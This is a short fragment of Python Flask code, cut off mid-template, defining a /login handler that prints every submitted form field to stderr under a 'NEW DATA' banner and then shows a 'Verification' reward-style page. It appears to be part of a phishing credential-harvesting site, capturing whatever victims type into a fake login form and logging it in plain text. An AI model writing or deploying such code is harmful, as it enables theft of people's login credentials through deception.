@app.route('/login', methods=['POST'])
def login():
    print(f"--- [NEW DATA] ---", file=sys.stderr)
    for key, value in request.form.items():
        print(f"{key}: {value}", file=sys.stderr)
    sys.stderr.flush()

    return render_template_string(f'''
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}</head>
    <body><div class="bg-layer"></div><div class="container" style="margin-top:80px;"><div class="reward-card"><h1>Verification</h1>
